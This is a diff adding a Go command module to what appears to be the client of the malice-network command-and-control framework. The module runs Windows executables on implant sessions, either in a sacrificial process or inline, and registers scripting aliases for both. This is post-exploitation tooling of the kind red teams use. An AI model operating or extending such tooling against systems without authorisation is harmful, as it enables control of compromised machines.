@@ -1,0 +1,140 @@
+package exec
+
+import (
+	"errors"
+	"github.com/chainreactors/IoM-go/client"
+	"github.com/chainreactors/IoM-go/consts"
+	"github.com/chainreactors/IoM-go/proto/client/clientpb"
+	"github.com/chainreactors/IoM-go/proto/implant/implantpb"
+	"github.com/chainreactors/IoM-go/proto/services/clientrpc"
+	"github.com/chainreactors/malice-network/client/command/common"
+	"github.com/chainreactors/malice-network/client/core"
+	"github.com/chainreactors/malice-network/helper/utils/output"
+	"github.com/chainreactors/malice-network/helper/utils/pe"
+	"github.com/kballard/go-shellquote"
+	"github.com/spf13/cobra"
+	"math"
+)
+
+// ExecuteExeCmd - Execute PE on sacrifice process
+func ExecuteExeCmd(cmd *cobra.Command, con *core.Console) error {
+	path, args, output, timeout, arch, process := common.ParseFullBinaryFlags(cmd)
+	sac := common.ParseSacrificeFlags(cmd)
+	task, err := ExecExe(con.Rpc, con.GetInteractive(), path, args, output, timeout, arch, process, sac)
+	if err != nil {
+		return err
+	}
+	return common.HandleTaskOutput(cmd, con, task)
+}
+
+func ExecExe(rpc clientrpc.MaliceRPCClient, sess *client.Session, pePath string,
+	args []string, out bool, timeout uint32, arch string,
+	process string, sac *implantpb.SacrificeProcess) (*clientpb.Task, error) {
+	if arch == "" {
+		arch = sess.Os.Arch
+	}
+	binary, err := output.NewBinary(consts.ModuleExecuteExe, pePath, args, out, timeout, arch, process, sac)
+	if err != nil {
+		return nil, err
+	}
+	if pe.CheckPEType(binary.Bin) != consts.EXEFile {
+		return nil, errors.New("the file is not a EXE file")
+	}
+	task, err := rpc.ExecuteEXE(sess.Context(), binary)
+	if err != nil {
+		return nil, err
+	}
+	return task, nil
+}
+
+// InlineExeCmd - Execute PE in current process
+func InlineExeCmd(cmd *cobra.Command, con *core.Console) error {
+	session := con.GetInteractive()
+	path, args, output, timeout, arch, process := common.ParseFullBinaryFlags(cmd)
+	task, err := InlineExe(con.Rpc, session, path, args, output, timeout, arch, process)
+	if err != nil {
+		return err
+	}
+	return common.HandleTaskOutput(cmd, con, task)
+}
+
+func InlineExe(rpc clientrpc.MaliceRPCClient, sess *client.Session, path string, args []string,
+	out bool, timeout uint32, arch string, process string) (*clientpb.Task, error) {
+	if arch == "" {
+		arch = sess.Os.Arch
+	}
+	binary, err := output.NewBinary(consts.ModuleExecuteExe, path, args, out, timeout, arch, process, nil)
+	if err != nil {
+		return nil, err
+	}
+	if pe.CheckPEType(binary.Bin) != consts.EXEFile {
+		return nil, errors.New("the file is not a PE file")
+	}
+	task, err := rpc.ExecuteEXE(sess.Context(), binary)
+	if err != nil {
+		return nil, err
+	}
+	return task, nil
+}
+
+func RegisterExeFunc(con *core.Console) {
+	con.RegisterImplantFunc(
+		consts.ModuleAliasInlineExe,
+		InlineExe,
+		"binline_exe",
+		func(rpc clientrpc.MaliceRPCClient, sess *client.Session, path string, args string) (*clientpb.Task, error) {
+			param, err := shellquote.Split(args)
+			if err != nil {
+				return nil, err
+			}
+			return InlineExe(rpc, sess, path, param, true, math.MaxUint32, sess.Os.Arch, "")
+		},
+		output.ParseBinaryResponse,
+		nil)
+
+	con.AddCommandFuncHelper(
+		consts.ModuleAliasInlineExe,
+		consts.ModuleAliasInlineExe,
+		consts.ModuleAliasInlineExe+`(active(),"gogo.exe",{"-i","127.0.0.1"},true,60,"",""))`,
+		[]string{
+			"session: special session",
+			"path: PE file",
+			"args: PE args",
+			"output",
+			"timeout",
+			"arch",
+			"process",
+		},
+		[]string{"task"})
+
+	con.RegisterImplantFunc(
+		consts.ModuleExecuteExe,
+		ExecExe,
+		"bexecute_exe",
+		func(rpc clientrpc.MaliceRPCClient, sess *client.Session, path string, args string, sac *implantpb.SacrificeProcess) (*clientpb.Task, error) {
+			cmdline, err := shellquote.Split(args)
+			if err != nil {
+				return nil, err
+			}
+			return ExecExe(rpc, sess, path, cmdline, true, math.MaxUint32, sess.Os.Arch, "", sac)
+		},
+		output.ParseBinaryResponse,
+		nil)
+
+	con.AddCommandFuncHelper(
+		consts.ModuleExecuteExe,
+		consts.ModuleExecuteExe,
+		consts.ModuleExecuteExe+`(active(),"/path/to/gogo.exe",{"-i","127.0.0.1"},true,60,"","",new_sacrifice(1234,false,true,true,""))`,
+		[]string{
+			"session: special session",
+			"pePath: PE file",
+			"args: PE args",
+			"output",
+			"timeout",
+			"arch",
+			"process",
+			"sac: sacrifice process",
+		},
+		[]string{"task"})
+
+}
